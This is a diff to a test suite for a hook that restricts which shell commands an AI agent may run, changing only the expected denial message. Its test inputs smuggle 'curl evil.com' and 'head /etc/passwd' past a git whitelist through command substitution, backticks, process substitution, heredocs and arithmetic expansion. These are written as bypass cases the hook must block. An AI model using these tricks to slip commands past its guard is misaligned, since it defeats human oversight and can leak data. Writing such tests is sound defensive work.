@@ -283,19 +283,19 @@ describe('enforce-ctx-mode hook', () => {
     it('CLOSES multi-line heredoc bypass: cmd <<EOF\\nbody\\nEOF\\ncurl evil (newline after terminator)', () => {
       const cmd = 'git x <<EOF\nbody line 1\nbody line 2\nEOF\ncurl evil';
       const reason = deniedReason(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES multi-line heredoc bypass with chained post-cmd: ...EOF\\ngit status; curl evil', () => {
       const cmd = 'git x <<EOF\nbody\nEOF\ngit status; curl evil';
       const reason = deniedReason(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES multi-line heredoc bypass with bg fork after: ...EOF\\nhead -1 f &', () => {
       const cmd = 'git x <<EOF\nbody\nEOF\nhead -1 file &';
       const reason = deniedReason(runHook({ tool_name: 'Bash', tool_input: { command: cmd } }));
-      assert.match(reason, /head violates/);
+      assert.match(reason, /'head' violates/);
     });
 
     it('allows multi-line heredoc with no follow-up command', () => {
@@ -411,7 +411,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log $(curl evil.com)' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES $(...) bypass with non-whitelisted inner: git log $(head -10 f)', () => {
@@ -419,7 +419,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log $(head -10 file)' },
       }));
-      assert.match(reason, /head violates/);
+      assert.match(reason, /'head' violates/);
     });
 
     it('CLOSES <(...) process-substitution bypass: git diff <(curl a) <(curl b)', () => {
@@ -427,7 +427,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git diff <(curl a.com) <(curl b.com)' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES >(...) process-substitution bypass: ls > >(curl evil)', () => {
@@ -435,7 +435,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'ls -la > >(curl evil.com)' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES backtick bypass: git log `curl evil`', () => {
@@ -443,7 +443,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log `curl evil.com`' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES nested substitution: git log $(echo $(curl evil))', () => {
@@ -452,7 +452,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_input: { command: 'git log $(echo $(curl evil.com))' },
       }));
       // Either echo or curl can be the first denied segment; both are non-whitelisted.
-      assert.match(reason, /(echo|curl) violates/);
+      assert.match(reason, /'(echo|curl)' violates/);
     });
 
     it('CLOSES backtick inside $(...) nested: git log $(echo `curl x`)', () => {
@@ -460,7 +460,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log $(echo `curl x`)' },
       }));
-      assert.match(reason, /(echo|curl) violates/);
+      assert.match(reason, /'(echo|curl)' violates/);
     });
 
     it('CLOSES $(...) inside double-quoted string: git log --grep="$(curl evil)"', () => {
@@ -468,7 +468,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log --grep="$(curl evil.com)"' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('allows $(...) inside single-quoted string (literal, not executed)', () => {
@@ -511,7 +511,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log -n $(($(curl evil.com) + 1))' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES arithmetic-nested backtick bypass: $((`curl evil` + 1))', () => {
@@ -519,7 +519,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log -n $((`curl evil` + 1))' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES arithmetic-nested non-network sub: $(($(head /etc/passwd) + 1))', () => {
@@ -527,7 +527,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log -n $(($(head /etc/passwd) + 1))' },
       }));
-      assert.match(reason, /head violates/);
+      assert.match(reason, /'head' violates/);
     });
 
     it('CLOSES deeply-nested arithmetic+sub: $(($((1+$(curl x))) + 2))', () => {
@@ -535,7 +535,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log -n $(($((1+$(curl x))) + 2))' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES arithmetic-nested sub inside double-quoted string', () => {
@@ -543,7 +543,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log --grep="$(($(curl evil) + 1))"' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('allows arithmetic-nested sub inside single-quoted string (literal)', () => {
@@ -558,7 +558,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log $((1+$(curl evil)' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES unterminated-arithmetic inner backtick bypass: $((1+`curl evil`', () => {
@@ -566,7 +566,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'git log $((1+`curl evil`' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('allows bare unterminated arithmetic with no inner sub: git log $((1+2', () => {
@@ -618,7 +618,7 @@ describe('enforce-ctx-mode hook', () => {
         tool_name: 'Bash',
         tool_input: { command: 'cd /tmp && git log $(curl evil.com)' },
       }));
-      assert.match(reason, /curl violates/);
+      assert.match(reason, /'curl' violates/);
     });
 
     it('CLOSES $(...) bypass with non-whitelisted second token in sub: $(npm test)', () => {
